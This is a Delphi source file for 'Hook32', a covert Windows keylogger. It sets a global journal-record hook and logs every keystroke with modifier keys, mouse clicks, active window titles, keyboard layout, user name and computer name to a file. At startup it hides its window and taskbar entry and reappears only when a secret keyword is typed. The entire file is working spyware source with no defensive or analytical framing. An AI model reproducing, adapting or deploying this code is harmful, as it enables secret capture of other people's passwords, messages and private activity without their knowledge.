unit Hookmain;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  Buttons, ComCtrls, StdCtrls, Menus, global, ExtCtrls;

type
  TFrmMain = class(TForm)
    StatusBar1: TStatusBar;
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Options1: TMenuItem;
    Help1: TMenuItem;
    Label3: TLabel;
    Stayontop: TMenuItem;
    N1: TMenuItem;
    Exit1: TMenuItem;
    Label4: TLabel;
    Timer1: TTimer;
    Button2: TButton;
    Hide1: TMenuItem;
    HideW: TSpeedButton;
    N2: TMenuItem;
    ViewLogfile1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Options1Click(Sender: TObject);
    procedure StayontopClick(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Help1Click(Sender: TObject);
    procedure HideWClick(Sender: TObject);
    procedure ViewLogfile1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmMain: TFrmMain;

Procedure ReOpenLog(s:string);

implementation /////////////////////////////////////////////////////////

uses Option,About;

{$R *.DFM}

var
  Hook: HHOOK;
const q:longint=0;

type
  PEventMsg = ^TEventMsg;
  TEventMsg = record
    message: Cardinal;
    paramL :Cardinal;
    paramH :Cardinal;
    time: TDateTime;{Double;}
{    timeL :LongInt;
    timeH :LongInt;}
    HWND:Integer;
end;

Var Log:Text;
    LogBuf:Pointer;
Procedure WriteLog(S:String);
begin
  {$i-}
    Append(Log);
  if ioResult<>0 Then ReWrite(Log);

  System.Write(Log,S);
  CloseFile(Log);
end;
Procedure OpenLog;
var U,C:ShortString;
    US,CS:dword;
begin
  AssignFile(Log,logName{'C:\____'});
  GetMem(LogBuf,1);
  {if LogBuf<>nil Then SetTextBuf(Log,LogBuf^,1);}
  US:=sizeof(U)-1; CS:=sizeof(C)-1;
  if GetUserName(@U[1],US)
    then U:=' User:'+StrPas(@U[1])
    else U:='';
  if GetComputerName(@C[1],CS)
    then C:=' Computer:'+StrPas(@C[1])
    else C:='';

  WriteLog(#13#10'[It''s a Hook32 Log-file '+DateTimeToStr(Now)+C+U+']'#13#10);
end;
Procedure CloseLog;
begin
  WriteLog(#13#10'[End of Log-file '+DateTimeToStr(Now)+']'#13#10);
end;

Procedure ReOpenLog(s:string);
begin
  if s<>logName Then begin
    WriteLog(#13#10'[Continue in '+s+']');
    CloseLog;
    logName:=S;
    OpenLog;
  end;
end;

var KeyState:Word=0;
const {k_Menu=1;
      k_Shift=2;
      k_Control=4;
      k_WinL=8;
      k_WinR=16;}
      k_Menu=4;
      k_Shift=1;
      k_Control=2;

Function GetFKeyName(L:LongInt):string;
begin
  case lo(L) of
    VK_CANCEL: result:='CANCEL';
    VK_BACK: result:='BACK';
    VK_TAB: result:='TAB';
    VK_CLEAR: result:='CLEAR';
    VK_RETURN: result:='ENTER';
    VK_SHIFT: result:='SHIFT';
    VK_CONTROL: result:='CONTROL';
    VK_MENU: result:='ALT';
    VK_PAUSE: result:='PAUSE';
    VK_CAPITAL: result:='CAPITAL';
    VK_ESCAPE: result:='ESCAPE';
    VK_SPACE: result:='SPACE';
    VK_PRIOR: result:='PG_UP';
    VK_NEXT: result:='PG_DN';
    VK_END: result:='END';
    VK_HOME: result:='HOME';
    VK_LEFT: result:='LEFT';
    VK_UP: result:='UP';
    VK_RIGHT: result:='RIGHT';
    VK_DOWN: result:='DOWN';
    VK_SELECT: result:='SELECT';
    VK_PRINT: result:='PRINT';
    VK_EXECUTE: result:='EXECUTE';
    VK_SNAPSHOT: result:='SNAPSHOT';
    VK_INSERT: result:='INSERT';
    VK_DELETE: result:='DELETE';
    VK_HELP: result:='HELP';

    VK_LWIN: result:='LWIN';
    VK_RWIN: result:='RWIN';
    VK_APPS: result:='APPS';
    {VK_0..VK_9}$30..$39: result:=Char(Lo(L));
    {VK_A..VK_Z}$41..$5A: result:=Char(Lo(L));

    VK_NUMPAD0..VK_NUMPAD9: result:='|'+inttostr(lo(L)-VK_NUMPAD0);
    VK_ADD: result:='|+';
    VK_SEPARATOR: result:='SEPARATOR';
    VK_SUBTRACT: result:='|-';
    VK_DIVIDE: result:='|/';
    VK_MULTIPLY: result:='|*';
    VK_DECIMAL: result:='DECIMAL';
    VK_NUMLOCK: result:='NUMLOCK';
    VK_SCROLL: result:='SCROLL';

    VK_PROCESSKEY: result:='PROCESSKEY';
    VK_ATTN: result:='ATTN';
    VK_CRSEL: result:='CRSEL';
    VK_EXSEL: result:='EXSEL';
    VK_EREOF: result:='EREOF';
    VK_PLAY: result:='PLAY';
    VK_ZOOM: result:='ZOOM';
    VK_NONAME: result:='NONAME';
    VK_PA1: result:='PA1';
    VK_OEM_CLEAR: result:='OEMCLEAR';

    VK_F1..VK_F24: result:='F'+inttostr(lo(L)-VK_F1+1);

    else result:='';
  end;
end;

var detect1:String[200]='';
    di1:byte=1;
var detect2:String[200]='';
    di2:byte=1;

Procedure Detect(L:LongInt);
begin
  detect1:='';
  if MySecret[di1]=char(L) Then inc(di1) else
  begin di1:=1; if MySecret[di1]=char(L) Then inc(di1); end;
  if di1-1=Length(MySecret) Then begin
    Beep;
    FrmMain.Visible := True;
  end;

  if KeyWord<>'' Then begin    
    detect2:='';
    if KeyWord[di2]=char(L) Then inc(di2) else         
    begin di2:=1; if KeyWord[di2]=char(L) Then inc(di2); end;
    if di2-1=Length(KeyWord) Then begin
      Beep;
      FrmMain.Visible := True;
    end;
  end;
end;

Function GetKeyName(L:LongInt):string;
var SBuf,S:ShortString;
    K:TkeyboardState;
    //Sh:shortint;
begin
  S:='';
  {Sh:=Hi(VkKeyScan('A'));
  KeyState:=sh;}
  {KeyState:=0;
  if GetAsyncKeyState(vk_Menu)>0 Then KeyState:=KeyState or k_Menu;
  if GetAsyncKeyState(vk_Control)>0 Then KeyState:=KeyState or k_Control;}

  If not (lo(L) in [vk_Menu,vk_Shift,vk_Control]) then
  {If not (lo(L) in [k_Control,k_Menu,k_Shift]) Then Begin}

   if (KeyState=0) or (KeyState=k_Shift) Then begin
       if (Lo(L)<30) and (KeyRecord>krBasic) Then S:=GetFKeyName(L);
       if (Lo(L)>=30)or (S='') then begin
         GetKeyboardState(k);
         ToAscii(L,0,k,@sbuf[1],0);
         S:=strpas(@SBuf[1]);
         if (S='') and (KeyRecord>krBasic) Then begin
           S:=GetFKeyName(L);
           if (KeyState=k_Shift) then
             if (KeyRecord>krMain) Then S:='Shift+'+S else S:='';
         end;
       end;
   end
   else
     case KeyRecord of
       krBasic:;
       krMain:if (KeyState=k_Control) or (KeyState=k_Shift+k_Control) Then Begin
           S:=GetFKeyName(L);
           if S='' then begin ToAscii(L,0,k,@sbuf[1],0); S:=strpas(@SBuf[1]); end;
           if S<>'' Then S:='Ctrl+'+S;
         end;
       krAll,krCrazy:begin
        S:=GetFKeyName(L);
        if S='' then begin ToAscii(L,0,k,@sbuf[1],0); S:=strpas(@SBuf[1]); end;
        if (S='') and (KeyRecord=krCrazy) then S:=''+char(L)+'(0x'+inttoHex((L),5)+')';
        if S<>'' Then begin
          if (KeyState and k_Control)<>0 Then S:='Ctrl+'+S;
          if (KeyState and k_Menu)<>0 Then S:='Alt+'+S;
          if (KeyState and k_Shift)<>0 Then S:='Shift+'+S;
        end;
       end;
     end

  Else begin
    if (KeyRecord=krCrazy) Then begin
      S:=GetFKeyName(L);
      if ((KeyState and k_Control)<>0) and (lo(L)<>vk_Control) Then S:='Ctrl+'+S;
      if ((KeyState and k_Menu)<>0) and (lo(L)<>vk_Menu) Then S:='Alt+'+S;
      if ((KeyState and k_Shift)<>0)and (lo(L)<>vk_Shift) Then S:='Shift+'+S;
    end;
  End;

  GetKeyName:=S;
end;



Function GetKeyLayout:string;
var S:ShortString;
begin
 GetKeyboardLayoutName(@S[1]);
 result:=strpas(@S[1]);
 {if Registry.OpenKey(
 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\keyboard layouts\00000409',
 false) then begin
   result:=Registry.ReadString('layout text');
 end;}
end;

Function GetMouseName(M:Word):string;
var s:shortstring;
begin
  S:='';
  case m of
    WM_MBUTTONUP: S:=#$18'M';
    WM_LBUTTONUP: S:=#$18'L';
    WM_RBUTTONUP: S:=#$18'R';
    WM_MBUTTONDBLCLK: S:=#$19#$19'M';
    WM_LBUTTONDBLCLK: S:=#$19#$19'L';
    WM_RBUTTONDBLCLK: S:=#$19#$19'R';
    WM_MBUTTONDown: S:=#$19'M';
    WM_LBUTTONDown: S:=#$19'L';
    WM_RBUTTONDown: S:=#$19'R';
  end;
  GetMouseName:=S;
end;

var qqq:longint=0;
function GetMsgHook1(nCode: Integer; wParam: Word; Lparam:LongInt): Longint;
stdcall export;(*Calling convention*)
begin
  inc(qqq);
  FrmMain.Label1.Caption:=inttostr(qqq);
  Result := CallNextHookEx(Hook, nCode, wParam, Lparam);
end;

var LastHot:String = '';

Procedure WriteHotInfo;
var S,t:string;
    lzS:PChar;
    Wnd:Integer;
begin
  lzS:=StrAlloc(1024);
  Wnd:=GetActiveWindow;
  GetWindowText(Wnd,lzS,1024);
  S:=strpas(lzS);
  if (Wnd<>GetFocus) and RecSubWindowTitle Then begin
    GetWindowText(GetParent(wnd),lzS,1024);
    if lzS<>nil then S:=S+' - '+strpas(lzS);
  end;
  StrDispose(lzS);
  if RecKBDLayout then S:=S+' | '+GetKeyLayout;
  if RecTime Then t:=' | '+TimeToStr(Time) else t:='';

  if LastHot<>S Then
    begin
      LastHot:=S;
      WriteLog(#13#10'['+s+t+']'#13#10);
    end
end;

function GetMsgHook(nCode: Integer; wParam: Word; Lparam:LongInt): Longint;
stdcall export;(*Calling convention*)
var P : PEventMsg absolute LParam;
    S:Shortstring;
begin
  WriteHotInfo;
  {if nCode=HC_ACTION Then}
  Case P^.Message of
      WM_KEYDOWN,WM_SysKEYDOWN: begin
        case lo(p^.ParamL) of
          vk_Menu: KeyState:=KeyState or k_Menu;
          vk_Shift: KeyState:=KeyState or k_Shift;
          vk_Control: KeyState:=KeyState or k_Control;
        end;
        S:=GetKeyName(p^.paramL);
        if length(S)>1 Then S:='{'+S+'}';
        FrmMain.Label4.Caption:=S;
        WriteLog(S);
        Detect(p^.ParamL);
      end;

      WM_KEYUp,WM_SysKEYUp: begin
        case lo(p^.ParamL) of
          vk_Menu: KeyState:=KeyState and not k_Menu;
          vk_Shift: KeyState:=KeyState and not k_Shift;
          vk_Control: KeyState:=KeyState and not k_Control;
        end;
        if RecordKeyUp Then Begin
          S:=GetKeyName(p^.paramL);
          S:='{†'+S+'}';
          FrmMain.Label4.Caption:=S;
          WriteLog(S);
        end;
      end;

      WM_MBUTTONUP,WM_LBUTTONUP,WM_RBUTTONUP,
      WM_MBUTTONDBLCLK,WM_LBUTTONDBLCLK,WM_RBUTTONDBLCLK,
      WM_MBUTTONDown,WM_LBUTTONDown,WM_RBUTTONDown:
        if RecordMouseClick then begin
          S:=GetMouseName(P^.Message);
          S:='{'+S+'Mouse '+inttostr((p^.paramL))+' '+inttostr((p^.paramH))+'}';
          FrmMain.Label4.Caption:=S;
          WriteLog(S);
        end;

      WM_MOUSEMOVE:
        FrmMain.Label2.Caption:='MouseMove';
      else FrmMain.Label2.Caption:=inttostr(P^.Message);
    End{case};
  {end;}
  {***************}

  Result := CallNextHookEx(Hook, nCode, wParam, Lparam);
end;

procedure TFrmMain.FormCreate(Sender: TObject);
begin
  {*}
  ShowWindow(Application.Handle, SW_HIDE);
  
  OpenLog;
  {Hook := SetWindowsHookEx(WH_JOURNALRECORD, @GetMsgHook, 0,0);}
  Timer1.enabled:=true;
//  Application.Title:=' ';

  
  {if StartHide Then Hide;Visible := False;}
  {ShowWindow(FrmMain.Handle, SW_HIDE);}
end;

procedure TFrmMain.FormDestroy(Sender: TObject);
begin
  UnhookWindowsHookEx(Hook);
  CloseLog;
end;

procedure TFrmMain.Options1Click(Sender: TObject);
var S:TFormStyle;
begin
  S:=FormStyle;
  FormStyle:=fsNormal;

  FrmOpti.ShowModal;
  while KeyWord='' do begin
//    FrmOpti.TabbedNotebook1.ActivePage:='StartUp';
//    FrmOpti.KeyWordEdit. BringToFront{SetFocus};
    FrmOpti.ShowModal;
  end;
  FormStyle:=S;
end;

procedure TFrmMain.StayontopClick(Sender: TObject);
begin
  Stayontop.Checked:= not Stayontop.Checked;
  if Stayontop.Checked Then
    FormStyle:=fsStayontop
  else
    FormStyle:=fsNormal;
end;

procedure TFrmMain.Exit1Click(Sender: TObject);
begin
  Close;
end;


procedure TFrmMain.Timer1Timer(Sender: TObject);
begin
  UnhookWindowsHookEx(Hook);
  Hook := SetWindowsHookEx(WH_JOURNALRECORD, @GetMsgHook, 0,{GetCurrentThreadId}0);
end;

procedure TFrmMain.Button2Click(Sender: TObject);
var S,R:ShortString;
    K:HKey;
    RR:longint;
begin
{  regedit    InternetOpenUrl
  if Registry.OpenKey(
 'HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\control\\keyboard layouts\\00000409\\layout text'
 ,false) then begin
   Button2.Caption:='true'Registry.ReadString('layout text');
 end else Button2.Caption:='false'}
  //S:='System\CurrentControlSet\control\keyboard layouts\00000409\layout text'#0;
  r:='';
  S:='Config\0001\Display\Settings'#0;
  RegOpenKey(HKEY_LOCAL_MACHINE,@S[1],k);
  RR:=254;
  S:='fixedfon.fon'#0;
  r:='';
  RegQueryValue(0,@S[1],@R[1],rr);
  Button2.Caption:=strpas(@R[1]);
end;

procedure TFrmMain.Help1Click(Sender: TObject);
var S:TFormStyle;
begin
  S:=FormStyle;
  FormStyle:=fsNormal;
  FrmAbout.ShowModal;
  FormStyle:=S;
end;

procedure TFrmMain.HideWClick(Sender: TObject);
var S:TFormStyle;
begin
  S:=FormStyle;  FormStyle:=fsNormal;

  if MessageDlg('Hook32 will presently become invisible.'#13+
                'That it appeared enter "'+KeyWord+'"'#13+
                'Hide now?',
     mtConfirmation, [mbYes, mbNo], 0) = mrYes
  then begin
       Visible := False;
       ShowWindow(Application.Handle, SW_HIDE);
  end;
  FormStyle:=S;
end;

procedure TFrmMain.ViewLogfile1Click(Sender: TObject);
var S:ShortString;
begin
  S:='notepad.exe '+logName+#0;
  WinExec(@S[1], SW_Show)
end;

end.
